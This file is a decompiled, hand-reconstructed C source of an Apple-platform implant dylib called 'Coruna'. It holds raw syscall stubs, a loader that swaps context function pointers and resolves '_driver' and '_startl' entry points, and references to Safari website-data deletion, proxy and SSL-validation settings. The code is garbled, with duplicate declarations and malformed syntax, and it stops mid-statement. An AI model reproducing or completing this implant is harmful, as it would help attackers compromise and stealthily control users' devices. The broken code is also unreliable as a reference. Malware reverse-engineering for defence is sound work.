/*
 * Coruna implant dylib (implant65fc) — hand-reconstructed native C
 *
 * Mach-O export _start: implant context, IO dispatch, dylib section resolve.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_mmap_anon_fd;
static uint64_t k_implant_slot_4e20 = 0x0000000000000000ULL;
static uint64_t k_implant_slot_5030 = 0x0000000000000000ULL;
static uint8_t k_implant_rodata_word_1e001 = 0xff;
static uint16_t k_implant_rodata_word_1e002 = 0x17ff;
static uint64_t k_implant_rodata_word_1e004 = 0x180000500000006cULL;
static uint16_t k_implant_rodata_word_1e007 = 0x5000;
static uint8_t k_implant_rodata_word_1e009 = 0x00;
static uint64_t k_implant_rodata_word_1e00a = 0x016c17ffffc91800ULL;
static uint8_t k_implant_rodata_word_1e00d = 0xff;
static uint16_t k_implant_rodata_word_1e00e = 0x17ff;
static uint8_t k_implant_rodata_word_1e010 = 0x6c;
static uint16_t k_implant_rodata_word_1e011 = 0x0001;
static uint8_t k_implant_rodata_word_1e013 = 0x00;
static uint32_t k_implant_rodata_word_1e014 = 0x18000050;
static uint64_t k_implant_rodata_word_1e018 = 0x0000018517ffffc6ULL;
static uint8_t k_implant_rodata_word_1e01b = 0x17;
static uint8_t k_implant_rodata_word_1e01c = 0x85;
static uint8_t k_implant_rodata_word_1e01d = 0x01;
static uint8_t k_implant_rodata_word_1e01e = 0x00;
static uint8_t k_implant_rodata_word_1e01f = 0x00;
static uint8_t k_implant_rodata_word_1e020 = 0x50;
static uint16_t k_implant_rodata_word_1e021 = 0x0000;
static uint64_t k_implant_rodata_word_1e023 = 0x0001cd17ffffc318ULL;
static uint8_t k_implant_rodata_word_1e033 = 0x17;
static uint8_t k_implant_rodata_word_1e034 = 0xe6;
static uint16_t k_implant_rodata_word_1e035 = 0x0001;
static uint64_t k_implant_rodata_word_1e037 = 0xffffbd1800005000ULL;
static uint8_t k_implant_rodata_word_1e03e = 0xff;
static uint16_t k_implant_rodata_word_1e03f = 0xff17;
static uint64_t k_implant_rodata_word_1e041 = 0xba18000050000001ULL;
static uint64_t k_implant_rodata_word_1e840 = 0x4090a80000000000ULL;
static uint64_t k_implant_rodata_word_1e848 = 0x408c200000000000ULL;
static uint64_t k_implant_rodata_word_1e880 = 0x0000000400000001ULL;
static uint64_t k_implant_rodata_word_1e888 = 0x408a980000000000ULL;
static uint64_t k_implant_rodata_word_1e890 = 0x0000001000000004ULL;
static uint64_t k_implant_rodata_word_1e8b0 = 0x0000000040000000ULL;
static uint64_t k_implant_rodata_word_1e8b8 = 0x4090ab3333333333ULL;
static uint64_t k_implant_rodata_word_1e8c0 = 0x0000002000000000ULL;
static uint64_t k_implant_rodata_word_1e8c8 = 0x0000000042000000ULL;
static uint64_t k_implant_rodata_word_1e8d8 = 0x0000000500000020ULL;
static uint64_t k_implant_rodata_word_1e900 = 0x408f400000000000ULL;
static uint64_t k_implant_rodata_word_1e908 = 0x0000002800000000ULL;
static uint64_t k_implant_rodata_word_1e920 = 0x0000013400000013ULL;
static uint64_t k_implant_rodata_word_1e938 = 0x0000001800000013ULL;
static uint64_t k_implant_rodata_word_200c8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_200e8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20118 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20138 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20158 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20178 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20198 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_201c8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_201f8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20228 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20248 = 0x00000000000113e0ULL;
static uint64_t k_implant_rodata_word_202c8 = 0x000000000000fa7cULL;
static uint64_t k_implant_rodata_word_202e8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20318 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20338 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20358 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20378 = 0x0000000000013440ULL;
static uint64_t k_implant_rodata_word_20400 = 0x00000000000113e0ULL;
static uint64_t k_implant_rodata_word_20418 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_204c8 = 0x0000000000013960ULL;
static uint64_t k_implant_rodata_word_204e0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20500 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20530 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_20560 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_24598 = 0x0000000000012d3cULL;
static uint8_t k_implant_rodata_word_245b0 = 0x00;
static uint8_t k_implant_rodata_word_245b1 = 0x00;
static uint64_t k_implant_rodata_word_245b2 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_245b8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_245c0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_245c8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_245d0 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_24610 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_24650 = 0x0100000cfeedfacfULL;
static uint64_t k_implant_rodata_word_24c30 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_24c3b = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_24c40 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_24c98 = 0x0000007373625f5fULL;
static uint64_t k_implant_rodata_word_24ca0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_24ca8 = 0x0000415441445f5fULL;
static uint64_t k_implant_rodata_word_1e850 = 0x000000000000000aULL;
static uint64_t k_implant_md5_init_state = 0x3320646e61707865ULL;
static uint64_t k_implant_rodata_word_1e910 = 0x0000000e00000001ULL;
static uint64_t k_implant_rodata_word_1e940 = 0x0000000000000008ULL;
static uint64_t k_implant_rodata_word_1e950 = 0x000000000000000aULL;
static void *k_implant_objc_class___nsstring_slot = (void *)0x0000000000000000ULL;
static void *k_implant_objc_class___nsurl_slot = (void *)0x0000000000000000ULL;
static void *k_implant_sandbox_check_no_report_slot = (void *)0x0000000000000000ULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0x0000000000000000ULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0x0000000000000000ULL;
static void *k_implant_nsconcretestackblock_slot = (void *)0x0000000000000000ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0x0000000000000000ULL;
static void *k_implant_cxa_finalize_ranges_slot = (void *)0x0000000000000000ULL;
static void *k_implant_stack_chk_guard_slot = (void *)0x0000000000000000ULL;
static void *k_implant_get_cpu_capabilities_slot = (void *)0x0000000000000000ULL;
static void *k_implant_dladdr_slot = (void *)0x0000000000000000ULL;
static void *k_implant_dlsym_slot = (void *)0x0000000000000000ULL;
static void *k_implant_dyldversionnumber_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfallocatordefault_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfbooleanfalse_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfhttpversion1_1_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfrunloopcommonmodes_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfrunloopdefaultmode_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfstreampropertyhttpproxy_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfstreampropertyhttpresponseheader_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfstreampropertysslsettings_slot = (void *)0x0000000000000000ULL;
static void *k_implant_kcfstreamsslvalidatescertificatechain_slot = (void *)0x0000000000000000ULL;
static void *k_implant_mach_task_self_slot = (void *)0x0000000000000000ULL;
static void *k_implant_objc_msgsend_slot = (void *)0x0000000000000000ULL;
static void *k_implant_strcmp_slot = (void *)0x0000000000000000ULL;
static void *k_implant_task_get_exc_guard_behavior_slot = (void *)0x0000000000000000ULL;
static void *k_implant_task_set_exc_guard_behavior_slot = (void *)0x0000000000000000ULL;
static void *k_implant_vm_page_mask_slot = (void *)0x0000000000000000ULL;
static void *PTR_s_URLWithString__00024540 = (void *)0x000000000001f1acULL;
static void *PTR_s_allProfileIdentifiers_00024548 = (void *)0x000000000001f226ULL;
static void *PTR_s_deleteSafariWebsiteDataRecord_co_00024550 = (void *)0x000000000001f259ULL;
static void *PTR_s_ephemeralTabGroupManager_00024558 = (void *)0x000000000001f20dULL;
static void *PTR_s_host_00024560 = (void *)0x000000000001f1d8ULL;
static void *PTR_s_stringWithCString_encoding__00024568 = (void *)0x000000000001f1bcULL;
static void *PTR_s_websiteDataRecordWithDomain__00024570 = (void *)0x000000000001f23cULL;
static void *PTR_s_websiteDataRecordWithDomain_prof_00024578 = (void *)0x000000000001f1ddULL;
coruna_svc_regpack_t coruna_write(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_open(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_close(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_getpid(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_ptrace(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mprotect(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_csops(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_stat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_fstat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_shared_region_check_np(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacia_2(void)
{
  return;
}





void coruna_pacia_3(void)
{
  return;
}





void coruna_pacia_4(void)
{
  return;
}
uint64_t coruna_return_zero(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_b(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_2(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_stub(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_stub_2(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_stub_3(void)
{
  CallSupervisor(0x80);
  return;
}





uint64_t coruna_implant65fc_residual_84(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (k_implant_slot_5030 != (void (*)0x0)) {
    u = (*k_implant_slot_5030)();
    return u;
  }
  return 0xffffffffffffffff;
}





uint64_t coruna_return_minus_one(void)
{
  return 0xffffffffffffffff;
}





uint64_t coruna_pad_stub(void)
{
  return 0;
}





uint64_t coruna_identity_6080(uint64_t val)
{
  return val;
}





uint64_t coruna_return_zero_6098(void)
{
  return 0;
}





uint64_t coruna_implant65fc_via_pacia(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  
  err = coruna_return_zero();
  if (err != 0) {
    u = coruna_pacia(val,id_2);
    return u;
  }
  return val;
}





uint64_t _startl(void *ctx,short *arg)
{
  byte err;
  long handle;
  long addr;
  long off;
  void *ptr;
  int err;
  uint64_t *ptr;
  void (*ptr)(void);
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  int host_info;
  void *serial_buf;
  long action;
  pthread_t block_ctx;
  pthread_attr_t stack_guard;
  
  u = 0xad001;
  if (ctx == (void *)0x0) {
    return 0xad001;
  }
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc104,0,0x730c416e);
  }
  if (((arg == (short *)0x0) || (*arg != 2)) || ((ushort)arg[1] < 2)) {
    if (*(char *)((long)ctx + 0x5eb) == '\0') {
      return 0xad001;
    }
    if (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c41ed);
    }
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
    }
    return u;
  }
  action = 0;
  u = coruna_implant65fc_via_ipc_resolve_entry(&action,ctx);
  if ((int)u != 0) {
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c41f4);
    }
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
    }
    return u;
  }
  serial_buf = (void *)0x0;
  host_info = 0;
  u = (**(void (**)(action + 0x20))(action,&serial_buf,&host_info);
  if ((int)u == 0) {
    thread_attr = 0;
    u = coruna_strdup(&thread_attr,ctx,*(uint64_t *)((long)ctx + 0x78),action,0x70003);
    bootargs = 0;
    if ((int)u == 0) {
      u = coruna_strdup(&bootargs,ctx,*(uint64_t *)((long)ctx + 0xa0),action,0x70004)
      ;
      scratch = 0;
      if (((int)u == 0) &&
         (u = coruna_strdup(&scratch,ctx,*(uint64_t *)((long)ctx + 0xa8),action,
                               0x70006), ptr = serial_buf, err = host_info, off = thread_attr,
         addr = bootargs, handle = scratch, (int)u == 0)) {
        if ((serial_buf == (void *)0x0) || (host_info == 0)) {
          if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
             (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
            (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c4fad);
          }
          u = 0xad001;
        }
        else {
          err = *(byte *)((long)ctx + 0x5c6);
          ptr = _calloc(0x38,1);
          if (ptr == (uint64_t *)0x0) {
            u = 0xad009;
            if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
               (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              u = 0xad009;
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad009,0,0x730c4fb7);
            }
          }
          else {
            *ptr = arg;
            ptr[2] = ptr;
            *(int *)(ptr + 3) = err;
            ptr[5] = addr;
            ptr[6] = handle;
            ptr[4] = off;
            *(byte *)(ptr + 1) = err ^ 1;
            err = _pthread_attr_init(&stack_guard);
            if (err == 0) {
              err = 1;
              if (err == 0) {
                err = 2;
              }
              err = _pthread_attr_setdetachstate(&stack_guard,err);
              if (err == 0) {
                block_ctx = (pthread_t)0x0;
                _memcpy(&k_implant_rodata_word_24650,ctx,0x648);
                err = _pthread_create(&block_ctx,&stack_guard,(void **)coruna_memset_s_71f8,ptr);
                if (err == 0) {
                  if (err != 0) {
                    _pthread_join(block_ctx,(void **)0x0);
                  }
                  _pthread_attr_destroy(&stack_guard);
                  coruna_ctx_free_1c8fc(action);
                  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
                    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
                  }
                  return 0;
                }
                if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                   (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                  err = 0xdde;
                  (*ptr)(ctx,0xad00b,0,err + 0x730c416e);
                }
              }
              else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                      (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                err = 0xddc;
                (*ptr)(ctx,0xad00b,0,err + 0x730c416e);
              }
              _pthread_attr_destroy(&stack_guard);
            }
            else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                    (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad00b,0,0x730c4f42);
            }
            _free(ptr);
            u = 0xad00b;
          }
        }
      }
    }
    else {
      scratch = 0;
    }
    if (thread_attr != 0) {
      coruna_memset_s();
    }
    if (bootargs != 0) {
      coruna_memset_s();
    }
    if (scratch != 0) {
      coruna_memset_s();
    }
    _memset_s(serial_buf,host_info,0,host_info);
    _free(serial_buf);
  }
  else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
          (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c4183);
  }
  coruna_ctx_free_1c8fc(action);
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
  }
  return u;
}





uint64_t
void coruna_strdup(uint64_t *val,long handle,char *path,long addr_2,uint64_t id_2)
{
  int err;
  char *ptr;
  uint64_t u;
  uint32_t scratch;
  char *bootargs;
  
  if ((val == (uint64_t *)0x0) || (addr_2 == 0)) {
    u = 0xad001;
    if ((handle != 0) &&
       ((*(char *)(handle + 0x5eb) != '\0' && (*(void (**)(handle + 0x5f0) != (void (*)0x0)))) {
      (**(void (**)(handle + 0x5f0))(handle,0xad001,0,0x730c410b);
    }
  }
  else if (path == (char *)0x0) {
    bootargs = (char *)0x0;
    scratch = 0;
    err = (**(void (**)(addr_2 + 0x18))(addr_2,id_2,&bootargs,&scratch);
    if (err == 0) {
      ptr = _strdup(bootargs);
      *val = ptr;
    }
    u = 0;
  }
  else {
    ptr = _strdup(path);
    u = 0;
    *val = ptr;
  }
  return u;
}





void coruna_memset_s(char *path)
{
  size_t ls1;
  
  if (path != (char *)0x0) {
    ls1 = _strlen(path);
    if (ls1 != 0) {
      _memset_s(path,ls1,0,ls1);
    }
    _free(path);
    return;
  }
  return;
}





rebase_opcode * _start(long arg)

{
  int err;
  rebase_opcode *lpr2;
  void (*ptr)(void);
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  void (*scratch)(void);
  uint64_t bootargs;
  short *thread_attr;
  void (*host_info)(void);
  uint64_t serial_buf;
  uint64_t action;
  long block_ctx;
  
  if (arg == 0) {
    return (rebase_opcode *)0xad001;
  }
  if (*(char *)(arg + 0x5c2) == '\0') {
    version = *(uint64_t *)(arg + 0x28);
    port = *(uint64_t *)(arg + 0xb0);
    kind = *(uint64_t *)(arg + 0x120);
    tag = *(uint64_t *)(arg + 0x128);
    *(void (**)(arg + 0x28) = coruna_surface_dispatch_thunk;
    *(void (**)(arg + 0xb0) = coruna_bzero;
    *(void (**)(arg + 0x120) = coruna_sys_icache_invalidate;
    *(void (**)(arg + 0x128) = coruna_bzero_2;
  }
  else {
    version = 0;
    port = 0;
    tag = 0;
    kind = 0;
  }
  if (*(char *)(arg + 0x5ec) != '\0') {
    *(uint8_t *)(arg + 0x5c6) = 1;
  }
  if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
    (**(void (**)(arg + 0x5f0))(arg,0xcc101,0,0x730c405e);
  }
  if (*(char *)(arg + 0x5c4) == '\0') {
    action = 0;
    block_ctx = 0;
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,0xcc102,0,0x730c4eec);
    }
    lpr2 = (rebase_opcode *)coruna_run_driver(&block_ctx,arg,1,&action);
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,0xcc103,0,0x730c4eeb);
    }
    if ((int)lpr2 == 0) {
      lpr2 = (rebase_opcode *)coruna_implant65fc_via_cat(block_ctx,arg,action);
      if ((int)lpr2 == 0) {
        lpr2 = (rebase_opcode *)coruna_run_startsc(arg,block_ctx,action);
      }
      else if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0))
      {
        (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c4ed1);
      }
      coruna_implant65fc_via_ctx_free_9e78(block_ctx,arg);
    }
    else if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c4eca);
    }
    if (*(uint32_t **)(arg + 0x5e0) != (uint32_t *)0x0) {
      **(uint32_t **)(arg + 0x5e0) = 5;
    }
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c404e);
    }
    if (*(char *)(arg + 0x5c2) == '\0') {
      *(uint64_t *)(arg + 0x28) = version;
      *(uint64_t *)(arg + 0xb0) = port;
      *(uint64_t *)(arg + 0x120) = kind;
      *(uint64_t *)(arg + 0x128) = tag;
    }
    return lpr2;
  }
  action = 0;
  block_ctx = 0;
  lpr2 = (rebase_opcode *)coruna_run_driver(&block_ctx,arg,0,&action);
  if ((int)lpr2 != 0) {
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c4e9a);
    }
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c404e);
    }
    if (*(char *)(arg + 0x5c2) == '\0') {
      *(uint64_t *)(arg + 0x28) = version;
      *(uint64_t *)(arg + 0xb0) = port;
      *(uint64_t *)(arg + 0x120) = kind;
      *(uint64_t *)(arg + 0x128) = tag;
    }
    return lpr2;
  }
  lpr2 = (rebase_opcode *)coruna_implant65fc_via_cat(block_ctx,arg,action);
  if ((int)lpr2 == 0) {
    host_info = (void (*)0x0;
    serial_buf = 0;
    lpr2 = (rebase_opcode *)coruna_implant65fc_residual_86(block_ctx,0x90000,"_driver",&serial_buf,&host_info);
    if ((int)lpr2 == 0) {
      thread_attr = (short *)0x0;
      if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
        (**(void (**)(arg + 0x5f0))(arg,0xcc102,0,0x730c4e6f);
      }
      lpr2 = (rebase_opcode *)(*host_info)(&thread_attr);
      if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
        (**(void (**)(arg + 0x5f0))(arg,0xcc103,0,0x730c4e65);
      }
      if ((int)lpr2 == 0) {
        if (((thread_attr == (short *)0x0) || (*thread_attr != 2)) || ((ushort)thread_attr[1] < 2)) {
          lpr2 = &rebase_opcode_00028007;
          if ((*(char *)(arg + 0x5eb) != '\0') &&
             (ptr = *(void (**)(arg + 0x5f0), ptr != (void (*)0x0)) {
            err = 0xe6a;
            (*ptr)(arg,lpr2,0,err + 0x730c404e);
          }
        }
        else {
          scratch = (void (*)0x0;
          bootargs = 0;
          lpr2 = (rebase_opcode *)coruna_implant65fc_residual_86(block_ctx,0x80000,"_startl",&bootargs,&scratch);
          if ((int)lpr2 == 0) {
            lpr2 = (rebase_opcode *)(*scratch)(arg,thread_attr);
            if ((int)lpr2 == 0) {
              if ((*(char *)(arg + 0x5c6) == '\0') ||
                 ((**(void (**)(block_ctx + 0x60))(block_ctx,bootargs),
                 *(char *)(arg + 0x5c6) == '\0')) {
                lpr2 = (rebase_opcode *)0x0;
                coruna_implant65fc_via_ctx_free_9e78(block_ctx,arg);
                if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                  (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c404e);
                }
                if (*(char *)(arg + 0x5c2) == '\0') {
                  *(uint64_t *)(arg + 0x28) = version;
                  *(uint64_t *)(arg + 0xb0) = port;
                  *(uint64_t *)(arg + 0x120) = kind;
                  *(uint64_t *)(arg + 0x128) = tag;
                }
                return lpr2;
              }
              lpr2 = (rebase_opcode *)0x0;
            }
            else {
              (**(void (**)(block_ctx + 0x60))(block_ctx,bootargs);
            }
          }
          else if ((*(char *)(arg + 0x5eb) != '\0') &&
